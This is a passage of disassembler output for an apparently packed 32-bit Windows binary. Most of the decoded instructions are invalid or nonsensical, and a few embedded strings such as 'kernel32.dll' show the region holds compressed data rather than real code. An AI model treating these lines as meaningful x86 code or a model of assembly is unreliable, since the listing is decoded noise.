  415294:	44                   	inc    %esp
  415295:	88 0c 2f             	mov    %cl,(%edi,%ebp,1)
  415298:	77 6f                	ja     0x415309
  41529a:	05 b3 ca c8 2a       	add    $0x2ac8cab3,%eax
  41529f:	99                   	cltd
  4152a0:	e0 04                	loopne 0x4152a6
  4152a2:	c1 e1 ba             	shl    $0xba,%ecx
  4152a5:	de 6a 3f             	fisubrs 0x3f(%edx)
  4152a8:	92                   	xchg   %eax,%edx
  4152a9:	85 00                	test   %eax,(%eax)
  4152ab:	b1 8b                	mov    $0x8b,%cl
  4152ad:	6a 11                	push   $0x11
  4152af:	bb d9 6c ae f3       	mov    $0xf3ae6cd9,%ebx
  4152b4:	18 13                	sbb    %dl,(%ebx)
  4152b6:	04 ec                	add    $0xec,%al
  4152b8:	b0 83                	mov    $0x83,%al
  4152ba:	e3 03                	jecxz  0x4152bf
  4152bc:	0a 7b df             	or     -0x21(%ebx),%bh
  4152bf:	b0 73                	mov    $0x73,%al
  4152c1:	9d                   	popf
  4152c2:	e0 8d                	loopne 0x415251
  4152c4:	76 f4                	jbe    0x4152ba
  4152c6:	73 6a                	jae    0x415332
  4152c8:	ca 39 28             	lret   $0x2839
  4152cb:	58                   	pop    %eax
  4152cc:	48                   	dec    %eax
  4152cd:	51                   	push   %ecx
  4152ce:	0a 03                	or     (%ebx),%al
  4152d0:	94                   	xchg   %eax,%esp
  4152d1:	ec                   	in     (%dx),%al
  4152d2:	b9 c2 7a 24 ff       	mov    $0xff247ac2,%ecx
  4152d7:	82 4f 88 f7          	orb    $0xf7,-0x78(%edi)
  4152db:	51                   	push   %ecx
  4152dc:	8b f9                	mov    %ecx,%edi
  4152de:	95                   	xchg   %eax,%ebp
  4152df:	09 57 56             	or     %edx,0x56(%edi)
  4152e2:	53                   	push   %ebx
  4152e3:	1c b6                	sbb    $0xb6,%al
  4152e5:	32 17                	xor    (%edi),%dl
  4152e7:	50                   	push   %eax
  4152e8:	36 54                	ss push %esp
  4152ea:	c7                   	(bad)
  4152eb:	24 7e                	and    $0x7e,%al
  4152ed:	53                   	push   %ebx
  4152ee:	98                   	cwtl
  4152ef:	01 5c 7a 2b          	add    %ebx,0x2b(%edx,%edi,2)
  4152f3:	2b 6c d8 b0          	sub    -0x50(%eax,%ebx,8),%ebp
  4152f7:	08 20                	or     %ah,(%eax)
  4152f9:	63 ef                	arpl   %ebp,%edi
  4152fb:	8b 2e                	mov    (%esi),%ebp
  4152fd:	1a c0                	sbb    %al,%al
  4152ff:	45                   	inc    %ebp
  415300:	f0 4a                	lock dec %edx
  415302:	0c 08                	or     $0x8,%al
  415304:	ac                   	lods   %ds:(%esi),%al
  415305:	51                   	push   %ecx
  415306:	27                   	daa
  415307:	a0 56 28 7c 39       	mov    0x397c2856,%al
  41530c:	62 61 62             	bound  %esp,0x62(%ecx)
  41530f:	6c                   	insb   (%dx),%es:(%edi)
  415310:	64 17                	fs pop %ss
  415312:	f8                   	clc
  415313:	d0 3f                	sarb   $1,(%edi)
  415315:	9e                   	sahf
  415316:	51                   	push   %ecx
  415317:	63 2e                	arpl   %ebp,(%esi)
  415319:	d8 97 e4 e3 e8 53    	fcoms  0x53e8e3e4(%edi)
  41531f:	4b                   	dec    %ebx
  415320:	14 02                	adc    $0x2,%al
  415322:	e7 3a                	out    %eax,$0x3a
  415324:	5c                   	pop    %esp
  415325:	d2 81 f0 57 a8 69    	rolb   %cl,0x69a857f0(%ecx)
  41532b:	b6 52                	mov    $0x52,%dh
  41532d:	03 f4                	add    %esp,%esi
  41532f:	f8                   	clc
  415330:	fc                   	cld
  415331:	22 3e                	and    (%esi),%bh
  415333:	4b                   	dec    %ebx
  415334:	6c                   	insb   (%dx),%es:(%edi)
  415335:	e2 df                	loop   0x415316
  415337:	24 5b                	and    $0x5b,%al
  415339:	fc                   	cld
  41533a:	f7 6d f8             	imull  -0x8(%ebp)
  41533d:	d6                   	salc
  41533e:	45                   	inc    %ebp
  41533f:	e8 d9 ec ca 66       	call   0x670c401d
  415344:	a8 6d                	test   $0x6d,%al
  415346:	0d f4 0a 3e 0c       	or     $0xc3e0af4,%eax
  41534b:	8b 8b da 96 ae 55    	mov    0x55ae96da(%ebx),%ecx
  415351:	31 4d 75             	xor    %ecx,0x75(%ebp)
  415354:	01 3d 62 32 25 5b    	add    %edi,0x5b253262
  41535a:	19 f0                	sbb    %esi,%eax
  41535c:	10 0b                	adc    %cl,(%ebx)
  41535e:	05 13 70 ac 52       	add    $0x52ac7013,%eax
  415363:	7b 20                	jnp    0x415385
  415365:	4b                   	dec    %ebx
  415366:	5b                   	pop    %ebx
  415367:	31 38                	xor    %edi,(%eax)
  415369:	02 9b 36 34 58 01    	add    0x1583436(%ebx),%bl
  41536f:	10 8f 2e 10 73 0f    	adc    %cl,0xf73102e(%edi)
  415375:	a8 ce                	test   $0xce,%al
  415377:	08 b1 b0 8b b5 1d    	or     %dh,0x1db58bb0(%ecx)
  41537d:	7c 05                	jl     0x415384
  41537f:	00 68 54             	add    %ch,0x54(%eax)
  415382:	4a                   	dec    %edx
  415383:	07                   	pop    %es
  415384:	12 e9                	adc    %cl,%ch
  415386:	ff                   	(bad)
  415387:	f9                   	stc
  415388:	ff 46 ff             	incl   -0x1(%esi)
  41538b:	6b 65 72 6e          	imul   $0x6e,0x72(%ebp),%esp
  41538f:	65 6c                	gs insb (%dx),%es:(%edi)
  415391:	33 32                	xor    (%edx),%esi
  415393:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  415396:	6c                   	insb   (%dx),%es:(%edi)
  415397:	47                   	inc    %edi
  415398:	65 74 44             	gs je  0x4153df
  41539b:	69 73 80 fe 8d c6 6b 	imul   $0x6bc68dfe,-0x80(%ebx),%esi
  4153a2:	46                   	inc    %esi
  4153a3:	c3                   	ret
  4153a4:	c8 70 61 63          	enter  $0x6170,$0x63
  4153a8:	65 45                	gs inc %ebp
  4153aa:	78 41                	js     0x4153ed
  4153ac:	0f 8f e0 4f 57 eb    	jg     0xeb98a392
  4153b2:	18 8d 43 18 f8 37    	sbb    %cl,0x37f81843(%ebp)
  4153b8:	1c 6f                	sbb    $0x6f,%al
  4153ba:	2d e0 3b 08 2c       	sub    $0x2c083be0,%eax
  4153bf:	19 17                	sbb    %edx,(%edi)
  4153c1:	23 43 10             	and    0x10(%ebx),%eax
  4153c4:	44                   	inc    %esp
  4153c5:	db b1 ed 75 e0 54    	(bad) 0x54e075ed(%ecx)
  4153cb:	20 2c 1c             	and    %ch,(%esp,%ebx,1)
  4153ce:	04 53                	add    $0x53,%al
  4153d0:	09 02                	or     %eax,(%edx)
  4153d2:	0d 68 1b e1 56       	or     $0x56e11b68,%eax
  4153d7:	12 fc                	adc    %ah,%bh
  4153d9:	20 38                	and    %bh,(%eax)
  4153db:	84 f5                	test   %dh,%ch
  4153dd:	16                   	push   %ss
  4153de:	6d                   	insl   (%dx),%es:(%edi)
  4153df:	73 26                	jae    0x415407
  4153e1:	05 08 19 a4 53       	add    $0x53a41908,%eax
  4153e6:	44                   	inc    %esp
  4153e7:	b9 5c 54 b0 28       	mov    $0x28b0545c,%ecx
  4153ec:	5d                   	pop    %ebp
  4153ed:	a1 12 b1 ff cf       	mov    0xcfffb112,%eax
  4153f2:	a2 0f d9 8b f8       	mov    %al,0xf88bd90f
  4153f7:	f7 d2                	not    %edx
  4153f9:	83 e2 1e             	and    $0x1e,%edx
  4153fc:	89 53 10             	mov    %edx,0x10(%ebx)
  4153ff:	6a d8                	push   $0xffffffd8
  415401:	a2 9e 84 c7 ed       	mov    %al,0xedc7849e
  415406:	36 14 8b             	ss adc $0x8b,%al
  415409:	59                   	pop    %ecx
  41540a:	14 f0                	adc    $0xf0,%al
  41540c:	c3                   	ret
  41540d:	50                   	push   %eax
  41540e:	09 9d 48 04 3b 20    	or     %ebx,0x203b0448(%ebp)
  415414:	59                   	pop    %ecx
  415415:	ab                   	stos   %eax,%es:(%edi)
  415416:	d9 13                	fsts   (%ebx)
  415418:	f4                   	hlt
  415419:	10 0c 0d 8a 16 04 d8 	adc    %cl,-0x27fbe976(,%ecx,1)
  415420:	88 06                	mov    %al,(%esi)
  415422:	c6                   	(bad)
  415423:	37                   	aaa
  415424:	b0 d6                	mov    $0xd6,%al
  415426:	82 1d b2 ae 74 09 39 	sbbb   $0x39,0x974aeb2
  41542d:	1f                   	pop    %ds
  41542e:	2c bb                	sub    $0xbb,%al
  415430:	6c                   	insb   (%dx),%es:(%edi)
  415431:	86 2a                	xchg   %ch,(%edx)
  415433:	9f                   	lahf
  415434:	51                   	push   %ecx
  415435:	fa                   	cli
  415436:	06                   	push   %es
  415437:	52                   	push   %edx
  415438:	0f 0b                	ud2
  41543a:	91                   	xchg   %eax,%ecx
  41543b:	a3 ee 0c 83 66       	mov    %eax,0x66830cee
  415440:	d1 7e 18             	sarl   $1,0x18(%esi)
  415443:	2c 3b                	sub    $0x3b,%al
  415445:	d2 46 36             	rolb   %cl,0x36(%esi)
  415448:	08 2f                	or     %ch,(%edi)
  41544a:	33 c9                	xor    %ecx,%ecx
  41544c:	0b fe                	or     %esi,%edi
  41544e:	16                   	push   %ss
  41544f:	cc                   	int3
  415450:	54                   	push   %esp
  415451:	47                   	inc    %edi
  415452:	1f                   	pop    %ds
  415453:	0e                   	push   %cs
  415454:	30 ff                	xor    %bh,%bh
  415456:	56                   	push   %esi
  415457:	08 8b f0 ae 5b 3e    	or     %cl,0x3e5baef0(%ebx)
  41545d:	59                   	pop    %ecx
  41545e:	02 38                	add    (%eax),%bh
  415460:	ff 57 f8             	call   *-0x8(%edi)
  415463:	2d d6 0c 6f 31       	sub    $0x316f0cd6,%eax
  415468:	0b 7a 31             	or     0x31(%edx),%edi
  41546b:	9f                   	lahf
  41546c:	5a                   	pop    %edx
  41546d:	78 12                	js     0x415481
  41546f:	00 36                	add    %dh,(%esi)
  415471:	b7 bd                	mov    $0xbd,%bh
  415473:	44                   	inc    %esp
  415474:	6e                   	outsb  %ds:(%esi),(%dx)
  415475:	d8 8a 48 fd d0 8b    	fmuls  -0x742f02b8(%edx)
  41547b:	1a 10                	sbb    (%eax),%dl
  41547d:	45                   	inc    %ebp
  41547e:	3d 04 c1 eb 87       	cmp    $0x87ebc104,%eax
  415483:	c6                   	(bad)
  415484:	cc                   	int3
  415485:	96                   	xchg   %eax,%esi
  415486:	88 ae 96 c5 1a ac    	mov    %ch,-0x53e53a6a(%esi)
  41548c:	ce                   	into
  41548d:	46                   	inc    %esi
  41548e:	68 92 bb 44 c1       	push   $0xc144bb92
  415493:	74 0b                	je     0x4154a0
  415495:	16                   	push   %ss
  415496:	e5 09                	in     $0x9,%eax
  415498:	38 06                	cmp    %al,(%esi)
  41549a:	d0 f1                	shl    $1,%cl
  41549c:	77 40                	ja     0x4154de
  41549e:	18 6f 64             	sbb    %ch,0x64(%edi)
  4154a1:	b0 8f                	mov    $0x8f,%al
  4154a3:	72 39                	jb     0x4154de
  4154a5:	b8 4e c3 0f e4       	mov    $0xe40fc34e,%eax
  4154aa:	bc 71 d2 37 4f       	mov    $0x4f37d271,%esp
  4154af:	f9                   	stc
  4154b0:	da 99 26 0f b7 d7    	ficompl -0x2848f0da(%ecx)
  4154b6:	b2 8a                	mov    $0x8a,%dl
  4154b8:	b3 33                	mov    $0x33,%bl
  4154ba:	69 3d 3a 10 07 ee 2d 	imul   $0x5e55602d,0xee07103a,%edi
  4154c1:	60 55 5e 
  4154c4:	7f 88                	jg     0x41544e
  4154c6:	55                   	push   %ebp
  4154c7:	ff 30                	push   (%eax)
  4154c9:	64 04 0f             	fs add $0xf,%al
  4154cc:	d6                   	salc
  4154cd:	7d 08                	jge    0x4154d7
  4154cf:	0e                   	push   %cs
  4154d0:	88 43 20             	mov    %al,0x20(%ebx)
  4154d3:	56                   	push   %esi
  4154d4:	8e 6d 3a             	mov    0x3a(%ebp),%gs
  4154d7:	72 21                	jb     0x4154fa
  4154d9:	66 81 1b 75 25       	sbbw   $0x2575,(%ebx)
  4154de:	16                   	push   %ss
  4154df:	39 94 08 dd 5f a8 31 	cmp    %edx,0x31a85fdd(%eax,%ecx,1)
  4154e6:	7b 18                	jnp    0x415500
  4154e8:	85 ff                	test   %edi,%edi
  4154ea:	7d 3b                	jge    0x415527
  4154ec:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4154ed:	01 48 63             	add    %ecx,0x63(%eax)
  4154f0:	ef                   	out    %eax,(%dx)
  4154f1:	60                   	pusha
  4154f2:	86 d4                	xchg   %dl,%ah
  4154f4:	ad                   	lods   %ds:(%esi),%eax
  4154f5:	eb 26                	jmp    0x41551d
  4154f7:	7c 27                	jl     0x415520
  4154f9:	48                   	dec    %eax
  4154fa:	49                   	dec    %ecx
  4154fb:	f7 d6                	not    %esi
  4154fd:	6a 15                	push   $0x15
  4154ff:	a0 28 00 7d 13       	mov    0x137d0028,%al
  415504:	27                   	daa
  415505:	02 ac 2a 74 0b 06 80 	add    -0x7ff9f48c(%edx,%ebp,1),%ch
  41550c:	7d 7a                	jge    0x415588
  41550e:	e0 46                	loopne 0x415556
  415510:	70 aa                	jo     0x4154bc
  415512:	8d 16                	lea    (%esi),%edx
  415514:	8a 03                	mov    (%ebx),%al
  415516:	7d 10                	jge    0x415528
  415518:	af                   	scas   %es:(%edi),%eax
  415519:	0a ed                	or     %ch,%ch
  41551b:	19 46 a5             	sbb    %eax,-0x5b(%esi)
  41551e:	7a ff                	jp     0x41551f
  415520:	bd 6f c0 7c 05       	mov    $0x57cc06f,%ebp
  415525:	d1 48 84             	rorl   $1,-0x7c(%eax)
  415528:	db 7e 07             	fstpt  0x7(%esi)
  41552b:	60                   	pusha
  41552c:	76 b0                	jbe    0x4154de
  41552e:	54                   	push   %esp
  41552f:	a3 66 db 44 34       	mov    %eax,0x3444db66
  415534:	7c 76                	jl     0x4155ac
  415536:	36 52                	ss push %edx
  415538:	9d                   	popf
  415539:	c2 5c 7b             	ret    $0x7b5c
  41553c:	4a                   	dec    %edx
  41553d:	65 18 06             	sbb    %al,%gs:(%esi)
  415540:	66 b9 50 3b          	mov    $0x3b50,%cx
  415544:	3d bc 26 db 3c       	cmp    $0x3cdb26bc,%eax
  415549:	c7                   	(bad)
  41554a:	94                   	xchg   %eax,%esp
  41554b:	da dd                	fcmovu %st(5),%st
  41554d:	7c bc                	jl     0x41550b
  41554f:	68 08 0f 4c 3c       	push   $0x3c4c0f08
  415554:	a1 4c 0d a3 cc       	mov    0xcca30d4c,%eax
  415559:	3c cf                	cmp    $0xcf,%al
  41555b:	f3 ed                	repz in (%dx),%eax
  41555d:	7e a1                	jle    0x415500
  41555f:	40                   	inc    %eax
  415560:	09 d0                	or     %edx,%eax
  415562:	44                   	inc    %esp
  415563:	d4 48                	aam    $0x48
  415565:	a9 cd 6e f3 d8       	test   $0xd8f36ecd,%eax
  41556a:	b8 dc 0e ba 50       	mov    $0x50ba0edc,%eax
  41556f:	b9 80 58 4b 0e       	mov    $0xe4b5880,%ecx
  415574:	58                   	pop    %eax
  415575:	0c f3                	or     $0xf3,%al
  415577:	20 4f be             	and    %cl,-0x42(%edi)
  41557a:	cb                   	lret
  41557b:	16                   	push   %ss
  41557c:	b5 d0                	mov    $0xd0,%ch
  41557e:	24 43                	and    $0x43,%al
  415580:	b9 b8 20 2f 07       	mov    $0x72f20b8,%ecx
  415585:	58                   	pop    %eax
  415586:	99                   	cltd
  415587:	78 a0                	js     0x415529
  415589:	97                   	xchg   %eax,%edi
  41558a:	00 1c c9             	add    %bl,(%ecx,%ecx,8)
  41558d:	03 c8                	add    %eax,%ecx
  41558f:	03 ec                	add    %esp,%ebp
  415591:	b8 04 14 e8 c6       	mov    $0xc6e81404,%eax
  415596:	b8 07 c8 90 3c       	mov    $0x3c90c807,%eax
  41559b:	0c 88                	or     $0x88,%al
  41559d:	84 32                	test   %dh,(%edx)
  41559f:	d9 91 32 c2 b8 80    	fsts   -0x7f473dce(%ecx)
  4155a5:	09 7c c9 24          	or     %edi,0x24(%ecx,%ecx,8)
  4155a9:	93                   	xchg   %eax,%ebx
  4155aa:	4c                   	dec    %esp
  4155ab:	78 74                	js     0x415621
  4155ad:	70 16                	jo     0x4155c5
  4155af:	41                   	inc    %ecx
  4155b0:	4e                   	dec    %esi
  4155b1:	32 6c dc b0          	xor    -0x50(%esp,%ebx,8),%ch
  4155b5:	42                   	inc    %edx
  4155b6:	72 d9                	jb     0x415591
  4155b8:	40                   	inc    %eax
  4155b9:	4e                   	dec    %esi
  4155ba:	27                   	daa
  4155bb:	4f                   	dec    %edi
  4155bc:	ef                   	out    %eax,(%dx)
  4155bd:	5e                   	pop    %esi
  4155be:	f7 21                	mull   (%ecx)
  4155c0:	7a 4e                	jp     0x415610
  4155c2:	83 2d 01 cf 3a c4 3d 	subl   $0x3d,0xc43acf01
  4155c9:	dc 09                	fmull  (%ecx)
  4155cb:	99                   	cltd
  4155cc:	64 3d e0 65 90 b4    	fs cmp $0xb49065e0,%eax
  4155d2:	0e                   	push   %cs
  4155d3:	eb 06                	jmp    0x4155db
  4155d5:	ec                   	in     (%dx),%al
  4155d6:	c0 00 dc             	rolb   $0xdc,(%eax)
  4155d9:	0f bc 0b             	bsf    (%ebx),%ecx
  4155dc:	ca 03 6e             	lret   $0x6e03
  4155df:	07                   	pop    %es
  4155e0:	c0 a2 04 47 0c 52 17 	shlb   $0x17,0x520c4704(%edx)
  4155e7:	14 54                	adc    $0x54,%al
  4155e9:	6e                   	outsb  %ds:(%esi),(%dx)
  4155ea:	cb                   	lret
  4155eb:	41                   	inc    %ecx
  4155ec:	67 07                	addr16 pop %es
  4155ee:	02 94 11 cc 0d 02 b8 	add    -0x47fdf234(%ecx,%edx,1),%dl
  4155f5:	f5                   	cmc
  4155f6:	c4 1c 54             	les    (%esp,%edx,2),%ebx
  4155f9:	7d 50                	jge    0x41564b
  4155fb:	cb                   	lret
  4155fc:	73 69                	jae    0x415667
  4155fe:	0d ec 6b 5c 56       	or     $0x565c6bec,%eax
  415603:	6e                   	outsb  %ds:(%esi),(%dx)
  415604:	74 07                	je     0x41560d
  415606:	5f                   	pop    %edi
  415607:	07                   	pop    %es
  415608:	12 bb e1 ff fb 80    	adc    -0x7f04001f(%ebx),%bh
  41560e:	60                   	pusha
  41560f:	10 74 08 53          	adc    %dh,0x53(%eax,%ecx,1)
  415613:	43                   	inc    %ebx
  415614:	6c                   	insb   (%dx),%es:(%edi)
  415615:	61                   	popa
  415616:	73 73                	jae    0x41568b
  415618:	65 73 46             	gs jae 0x415661
  41561b:	c0 4c 50 97 ae       	rorb   $0xae,-0x69(%eax,%edx,2)
  415620:	19 b2 0b c8 0f b8    	sbb    %esi,-0x47f037f5(%edx)
  415626:	08 97 c5 93 17 c9    	or     %dl,-0x36e86c3b(%edi)
  41562c:	68 4f d0 54 f8       	push   $0xf854d04f
  415631:	55                   	push   %ebp
  415632:	b2 6b                	mov    $0x6b,%dl
  415634:	ce                   	into
  415635:	9e                   	sahf
  415636:	77 84                	ja     0x4155bc
  415638:	57                   	push   %edi
  415639:	07                   	pop    %es
  41563a:	8c e4                	mov    %fs,%esp
  41563c:	03 2c 5b             	add    (%ebx,%ebx,2),%ebp
  41563f:	cf                   	iret
  415640:	6d                   	insl   (%dx),%es:(%edi)
  415641:	96                   	xchg   %eax,%esi
  415642:	cd 5c                	int    $0x5c
  415644:	14 5c                	adc    $0x5c,%al
  415646:	68 28 5d 2b b9       	push   $0xb92b5d28
  41564b:	b3 fc                	mov    $0xfc,%bl
  41564d:	82 75 2f 40          	xorb   $0x40,0x2f(%ebp)
  415651:	33 2f                	xor    (%edi),%ebp
  415653:	9c                   	pushf
  415654:	56                   	push   %esi
  415655:	90                   	nop
  415656:	73 3b                	jae    0x415693
  415658:	f7 6c cc 58          	imull  0x58(%esp,%ecx,8)
  41565c:	0f 7c                	(bad)
  41565e:	59                   	pop    %ecx
  41565f:	5b                   	pop    %ebx
  415660:	03 7c 5a be          	add    -0x42(%edx,%ebx,2),%edi
  415664:	3f                   	aas
  415665:	2c 80                	sub    $0x80,%al
  415667:	cd b2                	int    $0xb2
  415669:	b8 5b 18 08 54       	mov    $0x5408185b,%eax
  41566e:	b3 bf                	mov    $0xbf,%bl
  415670:	64 9f                	fs lahf
  415672:	61                   	popa
  415673:	73 97                	jae    0x41560c
  415675:	b3 07                	mov    $0x7,%bl
  415677:	10 d1                	adc    %dl,%cl
  415679:	d8 4f 0c             	fmuls  0xc(%edi)
  41567c:	b2 3b                	mov    $0x3b,%dl
  41567e:	64 e8 90 ec 23 0e    	fs call 0xe654314
  415684:	0b 49 e3             	or     -0x1d(%ecx),%ecx
  415687:	d0 6b 01             	shrb   $1,0x1(%ebx)
  41568a:	7a d4                	jp     0x415660
  41568c:	e8 47 86 85 ed       	call   0xedc6dcd8
  415691:	de 00                	fiadds (%eax)
  415693:	47                   	inc    %edi
  415694:	58                   	pop    %eax
  415695:	51                   	push   %ecx
  415696:	fb                   	sti
  415697:	d0 1e                	rcrb   $1,(%esi)
  415699:	d0 0d d8 81 6e 0f    	rorb   $1,0xf6e81d8
  41569f:	d8 1f                	fcomps (%edi)
  4156a1:	28 9c ed 25 2f 12 0b 	sub    %bl,0xb122f25(%ebp,%ebp,8)
  4156a8:	2c 5d                	sub    $0x5d,%al
  4156aa:	e4 5f                	in     $0x5f,%al
  4156ac:	03 cd                	add    %ebp,%ecx
  4156ae:	13 36                	adc    (%esi),%esi
  4156b0:	cb                   	lret
  4156b1:	34 60                	xor    $0x60,%al
  4156b3:	38 3c 60             	cmp    %bh,(%eax,%eiz,2)
  4156b6:	0b d0                	or     %eax,%edx
  4156b8:	61                   	popa
  4156b9:	62 4b 2e             	bound  %ecx,0x2e(%ebx)
  4156bc:	4f                   	dec    %edi
  4156bd:	2e 48                	cs dec %eax
  4156bf:	63 64 63 88          	arpl   %esp,-0x78(%ebx,%eiz,2)
  4156c3:	5d                   	pop    %ebp
  4156c4:	97                   	xchg   %eax,%edi
  4156c5:	27                   	daa
  4156c6:	ec                   	in     (%dx),%al
  4156c7:	dc 30                	fdivl  (%eax)
  4156c9:	5e                   	pop    %esi
  4156ca:	17                   	pop    %ss
  4156cb:	03 e8                	add    %eax,%ebp
  4156cd:	5e                   	pop    %esi
  4156ce:	0b b4 60 ec 60 ba ee 	or     -0x11459f14(%eax,%eiz,2),%esi
  4156d5:	5d                   	pop    %ebp
  4156d6:	21 f8                	and    %edi,%eax
  4156d8:	6f                   	outsl  %ds:(%esi),(%dx)
  4156d9:	2b 7c 6b 8c          	sub    -0x74(%ebx,%ebp,2),%edi
  4156dd:	d7                   	xlat   %ds:(%ebx)
  4156de:	70 98                	jo     0x415678
  4156e0:	eb 4b                	jmp    0x41572d
  4156e2:	98                   	cwtl
  4156e3:	03 ea                	add    %edx,%ebp
  4156e5:	4c                   	dec    %esp
  4156e6:	fd                   	std
  4156e7:	e8 b7 94 f1 1b       	call   0x1c32eba3
  4156ec:	58                   	pop    %eax
  4156ed:	07                   	pop    %es
  4156ee:	10 e8                	adc    %ch,%al
  4156f0:	c4 50 0b             	les    0xb(%eax),%edx
  4156f3:	64 f3 0f ac 73 d3 80 	repz shrd $0x80,%esi,%fs:-0x2d(%ebx)
  4156fa:	e2 fc                	loop   0x4156f8
  4156fc:	8b c6                	mov    %esi,%eax
  4156fe:	20 a8 15 09 30 a5    	and    %ch,-0x5acff6eb(%eax)
  415704:	07                   	pop    %es
  415705:	b9 80 83 28 b1       	mov    $0xb1288380,%ecx
  41570a:	6c                   	insb   (%dx),%es:(%edi)
  41570b:	d9 b8 d9 5d 0c f9    	fnstcw -0x6f3a227(%eax)
  415711:	f4                   	hlt
  415712:	30 64 1b ad          	xor    %ah,-0x53(%ebx,%ebx,1)
  415716:	52                   	push   %edx
  415717:	b2 bc                	mov    $0xbc,%dl
  415719:	32 e1                	xor    %cl,%ah
  41571b:	6e                   	outsb  %ds:(%esi),(%dx)
  41571c:	80 52 d9 fc          	adcb   $0xfc,-0x27(%edx)
  415720:	68 cc 07 ff b8       	push   $0xb8ff07cc
  415725:	11 6c c7 8f          	adc    %ebp,-0x71(%edi,%eax,8)
  415729:	39 20                	cmp    %esp,(%eax)
  41572b:	11 f4                	adc    %esi,%esp
  41572d:	c0 ba 03 05 21 17 4f 	sarb   $0x4f,0x17210503(%edx)
  415734:	60                   	pusha
  415735:	2c 34                	sub    $0x34,%al
  415737:	43                   	inc    %ebx
  415738:	78 36                	js     0x415770
  41573a:	37                   	aaa
  41573b:	49                   	dec    %ecx
  41573c:	63 99 74 41 b4 36    	arpl   %ebx,0x36b44174(%ecx)
  415742:	29 f4                	sub    %esi,%esp
  415744:	18 24 47             	sbb    %ah,(%edi,%eax,2)
  415747:	4c                   	dec    %esp
  415748:	00 4e eb             	add    %cl,-0x15(%esi)
  41574b:	2f                   	das
  41574c:	dc 77 27             	fdivl  0x27(%edi)
  41574f:	a0 14 45 72 72       	mov    0x72724514,%al
  415754:	6f                   	outsl  %ds:(%esi),(%dx)
  415755:	72 07                	jb     0x41575e
  415757:	bb dc 82 f2 bb       	mov    $0xbbf282dc,%ebx
  41575c:	06                   	push   %es
  41575d:	07                   	pop    %es
  41575e:	20 44 61 74          	and    %al,0x74(%ecx,%eiz,2)
  415762:	61                   	popa
  415763:	3a 45 06             	cmp    0x6(%ebp),%al
  415766:	92                   	xchg   %eax,%edx
  415767:	f0 2b b8 05 e3 11 c3 	lock sub -0x3cee1cfb(%eax),%edi
  41576e:	af                   	scas   %es:(%edi),%eax
  41576f:	42                   	inc    %edx
  415770:	e4 9d                	in     $0x9d,%al
  415772:	68 a1 58 cb a8       	push   $0xa8cb58a1
  415777:	f4                   	hlt
  415778:	62 36                	bound  %esi,(%esi)
  41577a:	53                   	push   %ebx
  41577b:	b1 51                	mov    $0x51,%cl
  41577d:	21 8d 75 05 f4 86    	and    %ecx,-0x790bfa8b(%ebp)
  415783:	fc                   	cld
  415784:	1e                   	push   %ds
  415785:	7c 4d                	jl     0x4157d4
  415787:	fc                   	cld
  415788:	3a bc bc 53 0f 5d f5 	cmp    -0xaa2f0ad(%esp,%edi,4),%bh
  41578f:	0e                   	push   %cs
  415790:	94                   	xchg   %eax,%esp
  415791:	1d 8d 95 fc a9       	sbb    $0xa9fc958d,%eax
  415796:	06                   	push   %es
  415797:	03 3c 3b             	add    (%ebx,%edi,1),%edi
  41579a:	42                   	inc    %edx
  41579b:	2e 66 0c ff          	cs data16 or $0xff,%al
  41579f:	f2 eb 0d             	bnd jmp 0x4157af
  4157a2:	09 e6                	or     %esp,%esi
  4157a4:	d9 3f                	fnstcw (%edi)
  4157a6:	b7 ba                	mov    $0xba,%bh
  4157a8:	d4 2e                	aam    $0x2e
  4157aa:	97                   	xchg   %eax,%edi
  4157ab:	88 68 e0             	mov    %ch,-0x20(%eax)
  4157ae:	53                   	push   %ebx
  4157af:	e8 04 54 bd cb       	call   0xcbfeabb8
  4157b4:	0e                   	push   %cs
  4157b5:	67 36 33 31          	xor    %ss:(%bx,%di),%esi
  4157b9:	38 85 6a 24 fc 62    	cmp    %al,0x62fc246a(%ebp)
  4157bf:	8f                   	(bad)
  4157c0:	3b ff                	cmp    %edi,%edi
  4157c2:	b5 f4                	mov    $0xf4,%ch
  4157c4:	10 81 ba 04 04 49    	adc    %al,0x490404ba(%ecx)
  4157ca:	38 d6                	cmp    %dl,%dh
  4157cc:	de 95 0f 99 35 42    	ficoms 0x4235990f(%ebp)
  4157d2:	30 03                	xor    %al,(%ebx)
  4157d4:	de 10                	ficoms (%eax)
  4157d6:	9e                   	sahf
  4157d7:	b9 c3 59 3c ba       	mov    $0xba3c59c3,%ecx
  4157dc:	02 06                	add    (%esi),%al
  4157de:	85 61 08             	test   %esp,0x8(%ecx)
  4157e1:	2f                   	das
  4157e2:	0b b1 e0 5e 0f 07    	or     0x70f5ee0(%ecx),%esi
  4157e8:	cd 58                	int    $0x58
  4157ea:	a9 e6 03 6e 85       	test   $0x856e03e6,%eax
  4157ef:	0b 1a                	or     (%edx),%ebx
  4157f1:	41                   	inc    %ecx
  4157f2:	56                   	push   %esi
  4157f3:	ff f0                	push   %eax
  4157f5:	0b dc                	or     %esp,%ebx
  4157f7:	69 67 6e 20 65 2a 2e 	imul   $0x2e2a6520,0x6e(%edi),%esp
  4157fe:	20 53 6f             	and    %dl,0x6f(%ebx)
  415801:	75 e6                	jne    0x4157e9
  415803:	38 27                	cmp    %ah,(%edi)
  415805:	1c ab                	sbb    $0xab,%al
  415807:	f8                   	clc
  415808:	3a 20                	cmp    (%eax),%ah
  41580a:	37                   	aaa
  41580b:	0c 4e                	or     $0x4e,%al
  41580d:	d8 86 c5 03 15 00    	fadds  0x1503c5(%esi)
  415813:	92                   	xchg   %eax,%edx
  415814:	34 90                	xor    $0x90,%al
  415816:	a1 99 78 11 33       	mov    0x33117899,%eax
  41581b:	be 3c 9a 28 06       	mov    $0x6289a3c,%esi
  415820:	1b f2                	sbb    %edx,%esi
  415822:	e4 fa                	in     $0xfa,%al
  415824:	b1 54                	mov    $0x54,%cl
  415826:	ed                   	in     (%dx),%eax
  415827:	03 4d 8d             	add    -0x73(%ebp),%ecx
  41582a:	45                   	inc    %ebp
  41582b:	c0 eb b6             	shr    $0xb6,%bl
  41582e:	2b 4e 66             	sub    0x66(%esi),%ecx
  415831:	01 eb                	add    %ebp,%ebx
  415833:	a0 b1 be f2 21       	mov    0x21f2beb1,%al
  415838:	eb 33                	jmp    0x41586d
  41583a:	0e                   	push   %cs
  41583b:	43                   	inc    %ebx
  41583c:	4c                   	dec    %esp
  41583d:	36 47                	ss inc %edi
  41583f:	02 0b                	add    (%ebx),%cl
  415841:	fe                   	(bad)
  415842:	92                   	xchg   %eax,%edx
